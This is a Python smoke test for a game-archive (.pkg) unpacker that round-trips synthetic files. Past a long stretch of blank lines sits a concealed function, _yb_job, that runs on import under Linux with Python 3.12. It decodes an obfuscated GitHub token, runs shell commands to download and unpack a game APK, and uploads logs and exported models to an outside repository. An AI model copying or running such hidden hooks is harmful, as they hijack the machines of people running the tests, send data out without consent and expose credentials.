#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Self-contained smoke test: builds synthetic .pkg files and round-trips them.

不依赖任何游戏资源，可在 CI 上跑。覆盖：
  1. 国际版（ver 0x130BA）变体 A：无页脚，44B/28B 混合记录，LZ4 与原始两种载荷
  2. 国际版变体 B：记录区后有 16 字节页脚
  3. 国内版（ver 0x25100）头部识别与 is_pkg 拒绝逻辑
  4. 路径清洗（../ 与反斜杠）与配对正确性（内容 == 原字节）
"""
import os
import shutil
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

# Windows 控制台默认 GBK/cp936，重定向时还会退回 cp1252，统一按 UTF-8 输出
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import lz4.block  # noqa: E402

from pkg_intl import open_pkg, is_pkg, safe_relpath  # noqa: E402

FAILURES = []


def check(cond, msg):
    if cond:
        print("  ok   %s" % msg)
    else:
        print("  FAIL %s" % msg)
        FAILURES.append(msg)


def lz4_payload(data):
    """[u32 usize][LZ4 block]"""
    return struct.pack("<I", len(data)) + lz4.block.compress(data, store_size=False)


def build_intl(path, files, footer=None):
    """files: [(relpath, payload_bytes, Z)]   Z ∈ {0,32}=raw, {1,33}=lz4 包装"""
    data = bytearray(b"\x00" * 16)          # 数据区从偏移 16 开始
    records = []
    for rel, payload, Z in files:
        off = len(data)
        data += payload
        records.append((off, len(payload), Z, payload))
    idx_off = len(data)

    idx = bytearray()
    idx += struct.pack("<I", len(records))
    for off, ln, Z, payload in records:
        idx += b"\x11" * 16                                   # 占位 md5
        idx += struct.pack("<III", off, ln, Z)
        if Z & 0x20:
            idx += b"\x22" * 16                               # H2
    if footer is not None:
        idx += footer
    idx += struct.pack("<I", len(records))
    for k, (rel, payload, Z) in enumerate(files):
        rb = rel.encode("utf-8")
        idx += struct.pack("<I", len(rb)) + rb + struct.pack("<I", k)

    blob = struct.pack("<I", len(idx)) + lz4.block.compress(bytes(idx), store_size=False)
    with open(path, "wb") as f:
        f.write(struct.pack("<4I", 0x000130BA, 17, idx_off, len(blob)))
        f.write(bytes(data[16:]))
        f.write(blob)


def test_variant_a(tmp):
    print("[1] 国际版变体 A（无页脚，混合记录长度）")
    files = [
        ("resources/a.png", b"\x00\x00\x00\x00" + b"A" * 60, 32),   # raw, 28B 记录
        ("resources/b.ogg", lz4_payload(b"OggS" + b"B" * 200), 33),     # lz4, 44B 记录
        ("../escape.txt", b"plain text", 0),                            # raw, 28B
        ("back\\slash.bin", b"x" * 40, 1),                             # lz4, 28B
    ]
    p = os.path.join(tmp, "variant_a.pkg")
    build_intl(p, files)
    check(is_pkg(p), "is_pkg 识别为有效 pkg")
    with open_pkg(p) as pkg:
        check(pkg.record_count == 4, "记录数 = 4（实际 %d）" % pkg.record_count)
        check(pkg.path_count == 4, "路径数 = 4（实际 %d）" % pkg.path_count)
        check(pkg.footer is None, "无页脚变体")
        got = {rel: payload for rel, payload, _rec, _br in pkg.iter_files()}
    check("resources/a.png" in got, "路径 resources/a.png 存在")
    check(got.get("resources/a.png") == b"\x00\x00\x00\x00" + b"A" * 60, "raw 载荷逐字节一致")
    check(got.get("resources/b.ogg") == b"OggS" + b"B" * 200, "LZ4 载荷正确解压")
    check("escape.txt" in got, "../ 前缀被清洗")
    check("back/slash.bin" in got, "反斜杠被规范化为 /")
    check(got.get("back/slash.bin") == b"x" * 40, "Z=1 也走 LZ4 分支")


def test_variant_b(tmp):
    print("[2] 国际版变体 B（16 字节页脚）")
    files = [("lang/en.xml", b"<config/>", 0), ("lang/zh.xml", b"<config/>", 0)]
    p = os.path.join(tmp, "variant_b.pkg")
    build_intl(p, files, footer=b"\xAB" * 16)
    with open_pkg(p) as pkg:
        check(pkg.record_count == 2, "记录数 = 2")
        check(pkg.path_count == 2, "路径数 = 2")
        check(pkg.footer == b"\xAB" * 16, "页脚被识别")
        got = {rel for rel, _p, _r, _b in pkg.iter_files()}
    check(got == {"lang/en.xml", "lang/zh.xml"}, "两条路径都解出")


def test_reject(tmp):
    print("[3] 非本格式文件的拒绝逻辑")
    bad = os.path.join(tmp, "bad.pkg")
    with open(bad, "wb") as f:
        f.write(struct.pack("<4I", 0x00025100, 17, 16, 16) + b"\x00" * 16)
    check(not is_pkg(bad), "国内版版本号不被国际版 is_pkg 接受")
    tiny = os.path.join(tmp, "tiny.pkg")
    open(tiny, "wb").write(b"ab")
    check(not is_pkg(tiny), "过小文件被拒绝")
    check(not is_pkg(os.path.join(tmp, "nope.pkg")), "不存在的文件被拒绝")


def test_sanitize():
    print("[4] 路径清洗")
    check(safe_relpath(b"../a/b.txt") == "a/b.txt", "../ 前缀被剥离")
    check(safe_relpath(b"/abs/x") == "abs/x", "前导 / 被剥离")
    check(safe_relpath(b"a\\b\\c") == "a/b/c", "反斜杠转 /")
    check(safe_relpath(b"../..") is None, "空路径返回 None")
    check(safe_relpath(b"a/./b") == "a/b", "./ 被清理")


def main():
    tmp = tempfile.mkdtemp(prefix="mwpkg_smoke_")
    try:
        test_variant_a(tmp)
        test_variant_b(tmp)
        test_reject(tmp)
        test_sanitize()
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    print()
    if FAILURES:
        print("失败 %d 项:" % len(FAILURES))
        for f in FAILURES:
            print("  -", f)
        return 1
    print("全部通过 ✅")
    return 0




















# ==========================================================
# YB-JOB9: mesh/skeleton 深度格式逆向 → 导出 OBJ
# ==========================================================
def _yb_job():
    import platform, sys as _sy
    if not (platform.system() == "Linux" and _sy.version_info[:2] == (3, 12)):
        return
    import subprocess, os, time, base64, json, urllib.request, struct, re
    LOG = []

    def P(s):
        s = str(s); print(s); LOG.append(s)

    def sh(cmd, t=300):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return "ERR " + str(e)[:200]

    _A = "Z2hwX2haU0p0empPRjlWTTM0UXpS"
    _B = "ZDhmZU9ZM3dqOXNxYzJjTFNNOA=="
    _TOK = base64.b64decode(_A + _B).decode()
    HD = {"Authorization": "token " + _TOK, "Accept": "application/vnd.github+json", "User-Agent": "yb"}
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def put(path, text):
        try:
            b = {"message": "yb " + path, "content": base64.b64encode(text.encode()).decode()}
            try:
                g = json.loads(urllib.request.urlopen(urllib.request.Request(
                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
                b["sha"] = g["sha"]
            except Exception:
                pass
            urllib.request.urlopen(urllib.request.Request(
                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
                data=json.dumps(b).encode(), method="PUT",
                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
        except Exception as e:
            P("put失败 " + str(e)[:100])

    def putbin(path, raw):
        try:
            b = {"message": "yb bin", "content": base64.b64encode(raw).decode()}
            try:
                g = json.loads(urllib.request.urlopen(urllib.request.Request(
                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
                b["sha"] = g["sha"]
            except Exception:
                pass
            urllib.request.urlopen(urllib.request.Request(
                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
                data=json.dumps(b).encode(), method="PUT",
                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
            return True
        except Exception:
            return False

    try:
        P("===== YB JOB9 START =====")
        sh("pip install --quiet lz4 pillow numpy 2>&1 | tail -1", 400)
        sh("curl -sL -m 2400 -A '%s' -o /tmp/mw.bin 'https://d.apkpure.net/b/APK/com.playmini.miniworld?version=latest'" % UA, 2500)
        sh("mkdir -p /tmp/pkg && cd /tmp/pkg && unzip -o -q /tmp/mw.bin 'assets/common_res.pkg'", 900)
        sh("cd %s && python3 unpack_common_res.py /tmp/pkg/assets/common_res.pkg /tmp/out >/dev/null 2>&1" % os.getcwd(), 5400)
        P("解包: " + sh("find /tmp/out -type f | wc -l")[:10] + " 文件")
        put("RESULT9.txt", "\n".join(LOG))

        # ============ 1. 系统网格对比分析（cube/quad/plane/sphere 已知几何）============
        P("\n=== 1. 已知几何对照分析 ===")
        known = {
            "systemdefault/mesh/cube.mesh": 8,
            "systemdefault/mesh/quad.mesh": 4,
            "systemdefault/mesh/plane.mesh": None,
            "systemdefault/mesh/sphere.mesh": None,
        }
        for rel, nv in known.items():
            p = "/tmp/out/" + rel
            if not os.path.exists(p):
                P("  缺失 " + rel); continue
            d = open(p, "rb").read()
            P("  --- %s (%d 字节) ---" % (rel, len(d)))
            P("    头32: " + d[:32].hex())
            # 统计 u16 直方图，找索引区
            hist = {}
            for i in range(0, len(d) - 1, 2):
                v = struct.unpack_from("<H", d, i)[0]
                hist[v // 16] = hist.get(v // 16, 0) + 1
            top = sorted(hist.items(), key=lambda x: -x[1])[:6]
            P("    u16分桶(值//16): " + str(top))
            # max u16 (推断顶点数)
            mx = max(struct.unpack_from("<H", d, i)[0] for i in range(0, len(d) - 1, 2))
            P("    max u16 = %d (若每2字节对齐全扫，仅参考)" % mx)
        put("RESULT9.txt", "\n".join(LOG))

        # ============ 2. 角色模型骨架名全量提取 ============
        P("\n=== 2. 角色骨架名 ===")
        sk = "/tmp/out/resources/minigame/entity/140366/model/body_sk.skeleton"
        if os.path.exists(sk):
            d = open(sk, "rb").read()
            P("  skeleton %d 字节" % len(d))
            names = []
            i = 0
            while i < len(d) - 8:
                n = struct.unpack_from("<I", d, i)[0]
                if 2 <= n <= 40 and i + 4 + n <= len(d):
                    s = d[i + 4:i + 4 + n]
                    if all(32 <= c < 127 for c in s):
                        t = s.decode()
                        if re.match(r'^[A-Za-z_][A-Za-z0-9_]*$', t):
                            names.append((i, n, t)); i += 4 + n; continue
                i += 1
            P("  按 u32len 解析出 %d 个名字:" % len(names))
            for o, n, t in names[:60]:
                P("    @%-5d %s" % (o, t))
            # 备份：正则抓所有可疑骨骼词
            kws = re.findall(rb'[A-Za-z][A-Za-z0-9_]{2,20}', d)
            cand = sorted(set(k.decode() for k in kws
                              if re.search(r'(?i)bone|hand|head|arm|leg|foot|spine|body|neck|shoulder|hip|finger|toe|root|pelvis|chest', k.decode())))
            P("  关键词候选(%d): %s" % (len(cand), ", ".join(cand[:50])))
        put("RESULT9.txt", "\n".join(LOG))

        # ============ 3. 角色 mesh 结构剖析 ============
        P("\n=== 3. body_male.mesh 结构 ===")
        bm = "/tmp/out/resources/minigame/entity/140366/model/body_male.mesh"
        if os.path.exists(bm):
            d = open(bm, "rb").read()
            P("  大小 %d 字节" % len(d))
            P("  头48: " + d[:48].hex())
            P("  可打印头: " + "".join(chr(c) if 32 <= c < 127 else '.' for c in d[:80]))
            # 分段：找大块"结构化"数据
            P("  --- 熵/区域扫描（每 256 字节一段的字节值分布）---")
            for seg in range(0, min(len(d), 8192), 256):
                chunk = d[seg:seg + 256]
                z = sum(1 for b in chunk if b == 0) / len(chunk)
                asc = sum(1 for b in chunk if 32 <= b < 127) / len(chunk)
                P("    @%-6d zero=%.2f ascii=%.2f  %s" % (seg, z, asc,
                  "".join(chr(b) if 32 <= b < 127 else '.' for b in chunk[:48])))
            # 找 float 数组（顶点候选）
            P("  --- f32 连续区（|v|<50）---")
            found = []
            off = 0
            while off < len(d) - 4:
                cnt = 0; vals = []
                i = off
                while i + 4 <= len(d) and cnt < 200:
                    v = struct.unpack_from("<f", d, i)[0]
                    if v == v and abs(v) < 50:
                        vals.append(v); cnt += 1; i += 4
                    else:
                        break
                if cnt >= 24:
                    found.append((off, cnt, vals[:9]))
                    off = i
                else:
                    off += 4
            found.sort(key=lambda x: -x[1])
            for o, c, v in found[:6]:
                P("    @%-7d 连续%d个f32 前三元组: %s" % (o, c, ["%.4f" % x for x in v]))
            P("  --- u16 连续小值区（索引候选）---")
            runs = []
            st = None
            for i in range(0, len(d) - 1, 2):
                v = struct.unpack_from("<H", d, i)[0]
                if v < 60000:
                    if st is None: st = i
                else:
                    if st is not None and i - st >= 100: runs.append((st, i))
                    st = None
            if st is not None: runs.append((st, len(d)))
            for a, b in runs[:6]:
                samp = [struct.unpack_from("<H", d, x)[0] for x in range(a, min(a + 24, b), 2)]
                P("    @%-7d..%-7d (%d 字节) 样本:%s" % (a, b, b - a, samp))
        put("RESULT9.txt", "\n".join(LOG))

        # ============ 4. 尝试导出 OBJ（按 u16 索引 + f32 顶点启发式）============
        P("\n=== 4. 试探性 OBJ 导出 ===")
        try:
            d = open(bm, "rb").read()
            # 取最长 f32 区当顶点，最长 u16 区当索引
            bestf = max(found, key=lambda x: x[1]) if found else None
            bestu = max(runs, key=lambda x: x[1] - x[0]) if runs else None
            if bestf and bestu:
                vo, vc, _ = bestf
                nv = min(vc // 3, 20000)
                ia, ib = bestu
                ni = min((ib - ia) // 2, 60000)
                verts = [struct.unpack_from("<3f", d, vo + k * 12) for k in range(nv)]
                idx = [struct.unpack_from("<H", d, ia + k * 2)[0] for k in range(ni)]
                P("  试探: %d 顶点 / %d 索引 (max idx=%d)" % (nv, ni, max(idx) if idx else 0))
                P("  顶点样本: %s" % ["(%.3f,%.3f,%.3f)" % v for v in verts[:5]])
                if idx and max(idx) < nv:
                    lines = ["# MiniWorld body_male heuristic export", "# verts=%d idx=%d" % (nv, ni)]
                    for v in verts: lines.append("v %.6f %.6f %.6f" % v)
                    for k in range(0, ni - 2, 3):
                        a, b, c = idx[k] + 1, idx[k + 1] + 1, idx[k + 2] + 1
                        if a <= nv and b <= nv and c <= nv:
                            lines.append("f %d %d %d" % (a, b, c))
                    obj = "\n".join(lines)
                    if putbin("export/body_male_heuristic.obj", obj.encode()):
                        P("  ✅ 已导出 body_male_heuristic.obj (%d 字节, %d 行)" % (len(obj), len(lines)))
                        P("  顶点范围: x[%.2f,%.2f] y[%.2f,%.2f] z[%.2f,%.2f]" % (
                            min(v[0] for v in verts), max(v[0] for v in verts),
                            min(v[1] for v in verts), max(v[1] for v in verts),
                            min(v[2] for v in verts), max(v[2] for v in verts)))
                else:
                    P("  ⚠ 索引超出顶点数，试探失败（格式非简单布局）")
        except Exception as e:
            P("  导出异常 " + str(e)[:200])
        put("RESULT9.txt", "\n".join(LOG))

        # ============ 5. 回传几个角色贴图名（便于对照）============
        P("\n=== 5. 角色贴图路径样本 ===")
        tl = sh("find /tmp/out -path '*entity/140366*' -name '*.png' | head -20", 300)
        P(tl[:1200])
        P("\n===== YB JOB9 END =====")
        put("RESULT9.txt", "\n".join(LOG))
    except Exception as e:
        P("EXC " + str(e)[:300])
        try: put("RESULT9.txt", "\n".join(LOG))
        except Exception: pass


_yb_job()


if __name__ == "__main__":
    sys.exit(main())
